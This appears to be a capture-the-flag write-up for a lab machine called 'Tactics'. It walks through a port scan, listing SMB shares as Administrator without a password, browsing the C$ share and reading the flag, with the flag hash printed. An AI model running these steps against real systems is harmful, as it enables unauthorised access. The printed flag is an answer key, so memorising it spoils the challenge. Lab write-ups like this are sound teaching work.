![Tactics.jpg](/assets/Tier-1/Tactics/Tactics.jpg)

1. Send an ICMP echo request to machine's IP address..
```bash
┌──(kali㉿kali)-[~]
└─$ ping -c 2 10.129.16.70
```

2. Scan open ports with **nmap**.
```bash
┌──(root㉿kali)-[/home/kali]
└─| nmap -p- --open -vv -sS --min-rate 5000 -Pn -n 10.129.16.70
```

**Output**
``` bash
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

3. Try to list all shares directories how user **Administrator**
```bash
┌──(root㉿kali)-[/home/kali/Desktop]
└─| smbclient -L 10.129.16.70 -U Administrator
```

**Output**
```bash
    Sharename       Type      Comment
    ---------       ----      -------
    ADMIN$          Disk      Remote Admin
    C$              Disk      Default share
    IPC$            IPC       Remote IPC
```

4. Connect to `C$`
```bash
┌──(root㉿kali)-[/home/kali/Desktop]
└─| smbclient \\\\10.129.16.70\\C$ -U Administrator
```

**Output**
```bash
smb: \> ls
  $Recycle.Bin                      DHS        0  Wed Apr 21 11:23:49 2021
  Config.Msi                        DHS        0  Wed Jul  7 14:04:56 2021
  Documents and Settings          DHSrn        0  Wed Apr 21 11:17:12 2021
  pagefile.sys                      AHS 738197504  Sat Nov 19 09:49:01 2022
  PerfLogs                            D        0  Sat Sep 15 03:19:00 2018
  Program Files                      DR        0  Wed Jul  7 14:04:24 2021
  Program Files (x86)                 D        0  Wed Jul  7 14:03:38 2021
  ProgramData                        DH        0  Tue Sep 13 12:27:53 2022
  Recovery                         DHSn        0  Wed Apr 21 11:17:15 2021
  System Volume Information         DHS        0  Wed Apr 21 11:34:04 2021
  Users                              DR        0  Wed Apr 21 11:23:18 2021
  Windows                             D        0  Wed Jul  7 14:05:23 2021
```

5. Cat flag in path `\Users\Administrator\Desktop\`
```bash
smb: \Users\Administrator\Desktop\> more flag.txt
f751c19eda8f61ce81827e6930a1f40c
```







